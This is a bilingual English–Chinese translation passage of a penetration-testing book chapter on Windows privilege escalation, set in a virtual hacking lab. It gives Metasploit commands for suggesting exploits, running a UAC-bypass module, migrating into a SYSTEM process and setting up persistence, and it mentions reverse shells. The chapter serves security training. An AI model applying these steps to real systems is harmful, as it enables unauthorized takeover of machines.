- en: '*Chapter 5*: Windows Kernel Exploits'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: '*第五章*：Windows 内核漏洞'
- en: Now that we have learned how to enumerate important information from our target
    system and have identified potential privilege escalation attack vectors, we can
    begin the privilege escalation process on Windows. The first privilege escalation
    attack vector we will be exploring is **kernel exploitation**.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们已经学会了如何枚举目标系统中的重要信息，并识别潜在的权限提升攻击途径，我们可以开始在 Windows 上进行权限提升。我们将探索的第一个权限提升攻击途径是**内核漏洞利用**。
- en: In this chapter, you will learn how to identify, transfer, and utilize kernel
    exploits on Windows both manually and automatically.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，你将学习如何手动和自动地识别、转移和利用 Windows 系统上的内核漏洞。
- en: You will learn how a kernel works and how you can leverage kernel vulnerabilities
    to elevate your privileges on the target system. This is a vital part of the privilege
    escalation process as kernel vulnerabilities provide a straightforward way of
    elevating your privileges on a target system.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 你将学习内核是如何工作的，以及如何利用内核漏洞提升在目标系统上的权限。这是权限提升过程中的一个关键部分，因为内核漏洞为在目标系统上提升权限提供了一条直接的途径。
- en: 'In this chapter, we''re going to cover the following main topics:'
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将覆盖以下主要主题：
- en: Understanding kernel exploits
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 理解内核漏洞
- en: Kernel exploitation with Metasploit
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用 Metasploit 进行内核漏洞利用
- en: Manual kernel exploitation
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 手动内核漏洞利用
- en: Technical requirements
  id: totrans-8
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 技术要求
- en: To follow along with the demonstrations in this chapter, you will need to ensure
    that you have familiarity with Windows CMD commands.
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
  zh: 要跟随本章的演示，你需要确保你熟悉 Windows CMD 命令。
- en: 'You can view this chapter''s code in action here: [https://bit.ly/3m7qa47](https://bit.ly/3m7qa47)'
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以在这里查看本章的代码演示：[https://bit.ly/3m7qa47](https://bit.ly/3m7qa47)
- en: Understanding kernel exploits
  id: totrans-11
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 理解内核漏洞
- en: Before we can get started with utilizing various kernel exploits on Windows,
    it is vitally important to understand what a kernel is and how it is set up and
    configured.
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们开始利用 Windows 上的各种内核漏洞之前，理解内核是什么，它是如何设置和配置的，至关重要。
- en: This will give you a clearer picture of how and why kernels are exploited and
    how they can be exploited to elevate privileges on Windows.
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 这将帮助你更清楚地了解内核是如何以及为何被利用，以及它们如何被用来提升 Windows 系统上的权限。
- en: Let's begin by understanding what a kernel is and what functions it serves in
    the context of an operating system.
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们从理解内核是什么以及它在操作系统中所执行的功能开始。
- en: What is a kernel?
  id: totrans-15
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 什么是内核？
- en: A kernel is a computer program that is the core of an operating system and has
    complete control over every resource and hardware on a system. It acts as a translation
    layer between hardware and software and facilitates the communication between
    these two layers.
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 内核是一个计算机程序，是操作系统的核心，拥有对系统中每一个资源和硬件的完全控制。它充当硬件和软件之间的翻译层，并促进这两者之间的通信。
- en: The kernel runs in system memory and is loaded immediately after the bootloader
    during the system startup process and is responsible for handling the remaining
    startup procedures for the operating system.
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 内核在系统内存中运行，并在系统启动过程中，紧接着引导程序后加载，负责处理操作系统的其余启动过程。
- en: 'The kernel is responsible for performing the following main functions:'
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 内核负责执行以下主要功能：
- en: '**Memory management**: The kernel is responsible for reading to, writing to,
    allocating, and deallocating system memory.'
  id: totrans-19
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**内存管理**：内核负责读取、写入、分配和回收系统内存。'
- en: '**Device management**: The kernel is responsible for managing and facilitating
    the I/O operations between the hardware peripherals and the operating system.'
  id: totrans-20
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**设备管理**：内核负责管理和促进硬件外设与操作系统之间的 I/O 操作。'
- en: '**I/O management**: The kernel is responsible for facilitating and managing
    the I/O operations between system resources such as the CPU and system memory.'
  id: totrans-21
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**I/O 管理**：内核负责促进和管理系统资源之间的 I/O 操作，如 CPU 和系统内存。'
- en: '**Resource management**: The kernel is responsible for managing the allocation
    and sharing of memory between various programs and processes.'
  id: totrans-22
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**资源管理**：内核负责管理各种程序和进程之间的内存分配和共享。'
- en: 'As illustrated in the following diagram, the kernel acts as an intermediary
    between hardware and software and facilitates and translates their interaction:'
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 如下图所示，内核充当硬件和软件之间的中介，促进并翻译它们之间的交互：
- en: '![Figure 5.1 – Kernel structure'
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 5.1 – 内核结构'
- en: '](Images/B17389_05_001.jpg)'
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_05_001.jpg)'
- en: Figure 5.1 – Kernel structure
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 图5.1 – 内核结构
- en: Now that we have a clear understanding of what a kernel is, what its functions
    are, and its role in an operating system, it becomes clear that a vulnerability
    within the kernel can be exploited and can potentially lead to privileged access
    and control over a system. It is for this reason that kernel exploits are valued
    by attackers during the privilege escalation process, as they offer a straightforward
    path for elevating privileges.
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经清楚了解了什么是内核、它的功能以及在操作系统中的作用，我们可以清楚地看到，内核中的漏洞可能被利用，进而导致对系统的特权访问和控制。正因如此，攻击者在特权升级过程中看重内核漏洞利用，因为它们提供了一个简单的路径来提升权限。
- en: It is to be noted, however, that kernel exploits can be unstable and may lead
    to system crashes and therefore need to be executed with tact and care. This is
    primarily because kernel exploits target the kernel and its functionality, therefore
    interfering with the core operation of the operating system as a whole. Consequently,
    system crashes caused by kernel exploits can lead to data loss and damage the
    operating system as a whole, which can become a liability during a penetration
    test.
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: 然而需要注意的是，内核漏洞利用可能不稳定，并可能导致系统崩溃，因此需要谨慎操作。这主要是因为内核漏洞利用会针对内核及其功能，进而干扰操作系统的核心操作。因此，由内核漏洞引发的系统崩溃可能导致数据丢失，并损坏整个操作系统，在渗透测试过程中可能成为一种风险。
- en: Let's take a brief look at the Windows kernel and how it is structured to get
    an understanding of how it functions.
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们简要了解一下Windows内核及其结构，以便理解它是如何工作的。
- en: Windows NT
  id: totrans-30
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Windows NT
- en: 'Windows NT is the kernel that comes pre-packaged with all versions of Microsoft
    Windows and operates like a traditional kernel with a few exceptions based on
    user design philosophy. It consists of two main modes of operation that determine
    access to system resources and hardware:'
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: Windows NT是所有版本的Microsoft Windows自带的内核，像传统内核一样运行，但基于用户设计理念有所不同。它由两种主要的操作模式组成，这些模式决定了对系统资源和硬件的访问：
- en: '**User mode**: Programs and services running in user mode have limited access
    to system resources and functionality.'
  id: totrans-32
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**用户模式**：在用户模式下运行的程序和服务只能有限地访问系统资源和功能。'
- en: '**Kernel mode**: Kernel mode has unrestricted access to system resources and
    functionality with the added functionality of managing devices and system memory.'
  id: totrans-33
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**内核模式**：内核模式对系统资源和功能拥有无限制的访问权限，还具备管理设备和系统内存的功能。'
- en: 'As illustrated in the following diagram, the two main modes of operation are
    used to segregate access to resources and hardware:'
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 如下图所示，主要有两种操作模式，用于隔离对资源和硬件的访问：
- en: '![Figure 5.2 – Windows kernel structure'
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: '![图5.2 – Windows内核结构'
- en: '](Images/B17389_05_002.jpg)'
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_05_002.jpg)'
- en: Figure 5.2 – Windows kernel structure
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: 图5.2 – Windows内核结构
- en: User mode consists of system-defined processes that communicate with the kernel
    through the use of Windows APIs. The processes running in user mode can also communicate
    with devices by sending I/O requests to the kernel-mode device drivers as highlighted
    in *Figure 5.2*.
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 用户模式包括与内核通过Windows API通信的系统定义进程。运行在用户模式中的进程还可以通过向内核模式设备驱动程序发送I/O请求与设备通信，如*图5.2*所示。
- en: Kernel mode has access to all devices and system resources and is also responsible
    for preventing user-mode services from interacting with and accessing functionality
    that they do not have access to.
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: 内核模式可以访问所有设备和系统资源，并且负责防止用户模式服务与其无权访问的功能进行交互和访问。
- en: Now that we have an understanding of how the Windows kernel functions and how
    it is structured, we can begin to delve into the Windows kernel exploitation process.
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经了解了Windows内核的功能和结构，我们可以开始深入探讨Windows内核漏洞利用过程。
- en: The Windows kernel exploitation process
  id: totrans-41
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Windows内核漏洞利用过程
- en: The Windows operating system is vulnerable to various attacks that can lead
    to exploitation or privilege escalation. We have already explored the process
    of identifying these vulnerabilities and their corresponding exploits in the previous
    chapter. In this chapter, we will be primarily focusing on how to correctly identify
    and exploit unpatched and vulnerable Windows systems to elevate our privileges.
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: Windows操作系统容易受到各种攻击，可能导致漏洞利用或特权升级。我们已经在上一章中探讨了如何识别这些漏洞及其相应的漏洞利用。在本章中，我们将重点讨论如何正确识别和利用未打补丁的脆弱Windows系统来提升我们的特权。
- en: This process will follow a two-pronged approach that will encompass the process
    of utilizing kernel exploits both manually and automatically.
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: 该过程将采取双管齐下的方法，包括手动和自动利用内核漏洞的过程。
- en: Kernel exploits on Windows will typically target vulnerabilities in the Windows
    kernel to execute arbitrary code in order to run privileged system commands or
    to obtain a system shell. This process will differ based on the version of Windows
    being targeted and the kernel exploit being used.
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: 在 Windows 上的内核利用通常会针对 Windows 内核中的漏洞，执行任意代码以运行特权系统命令或获得系统 shell。这个过程会根据目标 Windows
    版本以及使用的内核漏洞而有所不同。
- en: In this chapter, we will be using the **Windows 7 SP1** target virtual machine
    in our virtual hacking lab.
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 本章中，我们将在虚拟黑客实验室中使用 **Windows 7 SP1** 目标虚拟机。
- en: We can now begin the kernel exploitation process with the Metasploit framework.
    This will allow us to automate the process of identifying and exploiting kernel
    vulnerabilities on Windows.
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们可以开始使用 Metasploit 框架进行内核利用。这将使我们能够自动化识别和利用 Windows 内核漏洞的过程。
- en: Kernel exploitation with Metasploit
  id: totrans-47
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用 Metasploit 进行内核利用
- en: We can begin the kernel exploitation process by taking a look at how to use
    kernel exploits with the **Metasploit** framework. The Metasploit framework will
    offer an automated and modularized solution and will streamline the exploitation
    process.
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以通过了解如何使用内核漏洞与 **Metasploit** 框架结合，来开始内核利用过程。Metasploit 框架将提供一种自动化和模块化的解决方案，并简化利用过程。
- en: 'For this section, our target system will be the Windows SP1 virtual machine.
    As a prerequisite, ensure that you have gained your initial foothold on the system
    and have a **Meterpreter** session:'
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 对于本节，目标系统将是 Windows SP1 虚拟机。作为前提，确保您已经在系统上获取了初始控制并拥有 **Meterpreter** 会话：
- en: The first step involves scanning the target for potential exploits. We will
    be using the **local_exploit_suggester** module. This process was covered in depth
    in the previous chapter.
  id: totrans-50
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 第一步是扫描目标以查找潜在的漏洞。我们将使用 **local_exploit_suggester** 模块。此过程在上一章中已经深入讲解过。
- en: 'We can load the module in Metasploit by running the following command:'
  id: totrans-51
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们可以通过运行以下命令在 Metasploit 中加载该模块：
- en: '**use post/multi/recon/local_exploit_suggester**'
  id: totrans-52
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**使用 post/multi/recon/local_exploit_suggester**'
- en: 'After loading the module, you will need to set the **SESSION** option for the
    module. The **SESSION** option requires the session ID of your Meterpreter session.
    This can be done by running the following command:'
  id: totrans-53
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 加载模块后，您需要为该模块设置 **SESSION** 选项。**SESSION** 选项需要您的 Meterpreter 会话的会话 ID。可以通过运行以下命令来完成此操作：
- en: '**set SESSION <SESSION-ID>**'
  id: totrans-54
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**设置 SESSION <SESSION-ID>**'
- en: 'As illustrated in the following screenshot, the **SESSION** option should reflect
    the session ID you set:'
  id: totrans-55
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下图所示，**SESSION** 选项应反映您设置的会话 ID：
- en: '![Figure 5.3 – local_exploit_suggester options](Images/B17389_05_003.jpg)'
  id: totrans-56
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![图 5.3 – local_exploit_suggester 选项](Images/B17389_05_003.jpg)'
- en: Figure 5.3 – local_exploit_suggester options
  id: totrans-57
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 5.3 – local_exploit_suggester 选项
- en: 'After configuring the module options, we can run the module by running the
    following command:'
  id: totrans-58
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 配置模块选项后，我们可以通过运行以下命令来运行该模块：
- en: '**run**'
  id: totrans-59
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**运行**'
- en: 'This will begin the scanning process. During the process, the module will begin
    to output the various exploits that the target is potentially vulnerable to as
    highlighted in the following screenshot:'
  id: totrans-60
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 这将开始扫描过程。在此过程中，模块将开始输出目标可能存在的各种漏洞，如下图所示：
- en: '![Figure 5.4 – local_exploit_suggester results'
  id: totrans-61
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 5.4 – local_exploit_suggester 结果'
- en: '](Images/B17389_05_004.jpg)'
  id: totrans-62
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_05_004.jpg)'
- en: Figure 5.4 – local_exploit_suggester results
  id: totrans-63
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 5.4 – local_exploit_suggester 结果
- en: 'We can begin testing the various exploit modules recommended by **local_exploit_suggester**.
    The first few modules in the output usually have a higher chance of working successfully.
    We can test the first module in the list as highlighted in *Figure 5.4* by loading
    the module. This can be done by running the following command:'
  id: totrans-64
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们可以开始测试 **local_exploit_suggester** 推荐的各种漏洞模块。输出列表中的前几个模块通常更有可能成功。我们可以通过加载列表中的第一个模块来进行测试，正如*图
    5.4*中所示。可以通过运行以下命令来完成此操作：
- en: '**use /exploit/windows/local/bypassuac_eventvwr**'
  id: totrans-65
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**使用 /exploit/windows/local/bypassuac_eventvwr**'
- en: This kernel exploit module will bypass **User Access Control** (**UAC**) and
    insert a command in the Windows Registry that will be executed when the Windows
    Event Viewer is launched and will spawn a system shell – in this case, a Meterpreter
    session.
  id: totrans-66
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 这个内核漏洞利用模块将绕过 **用户访问控制** (**UAC**)，并在 Windows 注册表中插入一个命令，该命令将在启动 Windows 事件查看器时执行，并将启动一个系统
    shell——在这种情况下，是一个 Meterpreter 会话。
- en: Note
  id: totrans-67
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 注意
- en: This exploit does not exploit a vulnerability in the kernel, as it interacts
    and stores commands in the Windows Registry.
  id: totrans-68
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 该漏洞利用并未利用内核中的漏洞，而是通过与 Windows 注册表的交互并在其中存储命令来实现。
- en: 'More information regarding this exploit module can be found here: [https://www.rapid7.com/db/modules/exploit/windows/local/bypassuac_eventvwr/.](https://www.rapid7.com/db/modules/exploit/windows/local/bypassuac_eventvwr/%20)'
  id: totrans-69
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 关于该漏洞利用模块的更多信息，请参见：[https://www.rapid7.com/db/modules/exploit/windows/local/bypassuac_eventvwr/.](https://www.rapid7.com/db/modules/exploit/windows/local/bypassuac_eventvwr/%20)
- en: After loading the module, you will need to set the module options, which will
    include the Meterpreter session ID and the payload options for the new Meterpreter
    session as highlighted in the following screenshot:![Figure 5.5 – Kernel exploit
    module options](Images/B17389_05_005.jpg)
  id: totrans-70
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 加载模块后，您需要设置模块选项，包括 Meterpreter 会话 ID 和新 Meterpreter 会话的有效载荷选项，如下图所示：![图 5.5
    – 内核漏洞利用模块选项](Images/B17389_05_005.jpg)
- en: Figure 5.5 – Kernel exploit module options
  id: totrans-71
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 5.5 – 内核漏洞利用模块选项
- en: 'We can now run the kernel exploit module by running the following command:'
  id: totrans-72
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们现在可以通过运行以下命令来执行内核漏洞利用模块：
- en: '**exploit**'
  id: totrans-73
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**exploit**'
- en: 'In this case, the exploit is successful, as seen in the following screenshot.
    As a result, we will get a Meterpreter session with elevated privileges:'
  id: totrans-74
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 在这种情况下，漏洞利用是成功的，如下所示的截图所示。结果，我们将获得一个具有提升权限的 Meterpreter 会话：
- en: '![Figure 5.6 – Exploit successful'
  id: totrans-75
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 5.6 – 漏洞利用成功](Images/B17389_05_006.jpg)'
- en: '](Images/B17389_05_006.jpg)'
  id: totrans-76
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_05_006.jpg)'
- en: Figure 5.6 – Exploit successful
  id: totrans-77
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 5.6 – 漏洞利用成功
- en: 'We can now enumerate the privileges we have on the system by running the following
    command:'
  id: totrans-78
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们现在可以通过运行以下命令枚举系统上的权限：
- en: '**getuid**'
  id: totrans-79
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**getuid**'
- en: 'The output is as shown in the following screenshot:'
  id: totrans-80
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 输出如下所示：
- en: '![Figure 5.7 – Meterpreter privileges'
  id: totrans-81
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 5.7 – Meterpreter 权限](Images/B17389_05_007.jpg)'
- en: '](Images/B17389_05_007.jpg)'
  id: totrans-82
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_05_007.jpg)'
- en: Figure 5.7 – Meterpreter privileges
  id: totrans-83
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 5.7 – Meterpreter 权限
- en: 'As shown in the preceding screenshot, we do not yet have elevated privileges,
    however, we can list out the privileges we have on the current Meterpreter session
    by running the following command:'
  id: totrans-84
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如前所示的截图所示，我们尚未获得提升的权限，但我们可以通过运行以下命令列出当前 Meterpreter 会话中的权限：
- en: '**getprivs**'
  id: totrans-85
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**getprivs**'
- en: 'The output is as shown in the following screenshot:'
  id: totrans-86
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 输出如下所示：
- en: '![Figure 5.8 – Meterpreter privileges'
  id: totrans-87
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 5.8 – Meterpreter 权限](Images/B17389_05_008.jpg)'
- en: '](Images/B17389_05_008.jpg)'
  id: totrans-88
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_05_008.jpg)'
- en: Figure 5.8 – Meterpreter privileges
  id: totrans-89
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 5.8 – Meterpreter 权限
- en: As shown in the preceding screenshot, this Meterpreter session has administrative
    privileges and we can migrate to an **NT AUTHORITY/SYSTEM**process.
  id: totrans-90
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如前所示的截图所示，这个 Meterpreter 会话具有管理员权限，我们可以迁移到 **NT AUTHORITY/SYSTEM** 进程。
- en: 'We can enumerate the running processes by running the following command:'
  id: totrans-91
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们可以通过运行以下命令枚举正在运行的进程：
- en: '**ps**'
  id: totrans-92
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**ps**'
- en: 'This command will output a list of running processes, their respective process
    IDs, and the process owner, as shown in the following screenshot:'
  id: totrans-93
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 此命令将输出正在运行的进程列表、各自的进程 ID 和进程所有者，如下所示：
- en: '![Figure 5.9 – Meterpreter processes ](Images/B17389_05_009.jpg)'
  id: totrans-94
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![图 5.9 – Meterpreter 进程](Images/B17389_05_009.jpg)'
- en: Figure 5.9 – Meterpreter processes
  id: totrans-95
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 5.9 – Meterpreter 进程
- en: 'We can migrate to the **winlogon.exe** process as it is owned by the **NT AUTHORITY/SYSTEM**
    user. This can be done by running the following command:'
  id: totrans-96
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们可以迁移到 **winlogon.exe** 进程，因为该进程由 **NT AUTHORITY/SYSTEM** 用户拥有。可以通过运行以下命令来实现：
- en: '**migrate <PID>**'
  id: totrans-97
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**migrate <PID>**'
- en: 'After successful migration, we can recheck our privileges by running the **getuid**
    command or the **whoami** command within a system shell:'
  id: totrans-98
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 成功迁移后，我们可以通过在系统 shell 中运行 **getuid** 命令或 **whoami** 命令来重新检查我们的权限：
- en: '![Figure 5.10 – Successful privilege escalation](Images/B17389_05_010.jpg)'
  id: totrans-99
  prefs: []
  type: TYPE_IMG
  zh: '![图 5.10 – 权限提升成功](Images/B17389_05_010.jpg)'
- en: Figure 5.10 – Successful privilege escalation
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: 图 5.10 – 权限提升成功
- en: As shown in the preceding screenshot, we have successfully elevated our privileges
    and can run system commands and access any resource on the system.
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: 如前所示的截图所示，我们已成功提升了权限，可以运行系统命令并访问系统上的任何资源。
- en: We now have elevated privileges on the system and can begin performing post-exploitation
    procedures. It is recommended to set up persistence for the elevated Meterpreter
    session in the event the process is killed or the system is shut down.
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在在系统上获得了提升的权限，可以开始执行后期利用操作。建议为提升的Meterpreter会话设置持久化，以防该进程被杀死或系统关闭。
- en: This process will differ depending on the type of exploit module and the type
    of attack being performed, however, the process will remain similar when using
    the Metasploit framework.
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: 这个过程将根据漏洞模块的类型和所执行的攻击类型有所不同，但在使用Metasploit框架时，过程将保持相似。
- en: The kernel exploitation process with Metasploit is much more streamlined as
    a lot of the steps can be automated, however, you might be in a situation where
    you only have access via a standard shell as opposed to a Meterpreter session.
    This is where manual kernel exploitation comes into play.
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: 使用Metasploit进行内核利用的过程要简化得多，因为许多步骤可以自动化，然而，您可能会遇到只有通过标准shell而非Meterpreter会话访问目标的情况。这时，手动内核利用就变得很重要。
- en: Manual kernel exploitation
  id: totrans-105
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 手动内核利用
- en: In some cases, you will not have access to a target with a Meterpreter session
    or you may have exploited the target through a manual exploitation technique such
    as a web shell. In that event, you will have access through a standard reverse
    shell most likely facilitated through **netcat**. This poses a few issues; how
    can I scan the target for potential kernel exploits? And how can I transfer over
    the kernel exploit to the target?
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: 在某些情况下，您可能无法访问具有Meterpreter会话的目标，或者您可能是通过手动利用技术（如Web shell）来利用目标的。在这种情况下，您将通过标准反向Shell访问目标，通常是通过**netcat**实现的。这会带来一些问题；我该如何扫描目标以寻找潜在的内核漏洞？我又该如何将内核漏洞传输到目标上呢？
- en: These are the issues we will be addressing in this section; our target of choice
    will be the Windows 7 virtual machine.
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: 这些是我们将在本节中解决的问题；我们的目标选择将是Windows 7虚拟机。
- en: Local enumeration
  id: totrans-108
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 本地枚举
- en: The first step is to scan and identify potential kernel vulnerabilities. This
    can be done through the use of the **Windows-Exploit-Suggester** tool or other
    enumeration scripts and tools. In this case, we will utilize the **winPEAS** binary
    to enumerate information from our target.
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: 第一步是扫描并识别潜在的内核漏洞。可以通过使用**Windows-Exploit-Suggester**工具或其他枚举脚本和工具来完成。在这种情况下，我们将利用**winPEAS**二进制文件来枚举我们的目标信息。
- en: Note
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: 注意
- en: winPEAS is a local Windows enumeration script that searches and scans for potential
    vulnerabilities and enumerates all important system information that can be used
    to stage a privilege escalation attack.
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: winPEAS是一个本地Windows枚举脚本，用于搜索和扫描潜在漏洞，并枚举所有可以用于进行特权提升攻击的重要系统信息。
- en: 'The **winPEAS** binary can be downloaded from the GitHub repository here: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe.](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe%20)'
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: '**winPEAS**二进制文件可以从GitHub存储库下载，链接如下：[https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe.](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe%20)'
- en: 'Ensure you download the correct binary based on the architecture of your target
    operating system; the architecture-specific binaries can be found in the **binaries**
    folder as highlighted in the following screenshot:'
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 确保根据目标操作系统的架构下载正确的二进制文件；特定架构的二进制文件可以在**binaries**文件夹中找到，以下截图突出显示了该文件夹：
- en: '![Figure 5.11 – winPEAS binaries'
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
  zh: '![图5.11 – winPEAS二进制文件'
- en: '](Images/B17389_05_011.jpg)'
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_05_011.jpg)'
- en: Figure 5.11 – winPEAS binaries
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: 图5.11 – winPEAS二进制文件
- en: After downloading the binary to our Kali VM, we need to transfer the **winPEAS.exe**
    binary to our target virtual machine. This cannot be done automatically as we
    do not have a Meterpreter session. As a result, we will need to make use of Windows-specific
    utilities to download the binary.
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 在将二进制文件下载到我们的Kali虚拟机后，我们需要将**winPEAS.exe**二进制文件传输到我们的目标虚拟机。这不能自动完成，因为我们没有Meterpreter会话。因此，我们将需要利用Windows特定的工具来下载该二进制文件。
- en: Transferring files
  id: totrans-118
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 传输文件
- en: 'In order to transfer the **winPEAS.exe** binary to our target, we will need
    to set up a web server on our Kali VM that will be used to host the binary so
    that we can download it on the target system. This can be done by following the
    procedure outlined here:'
  id: totrans-119
  prefs: []
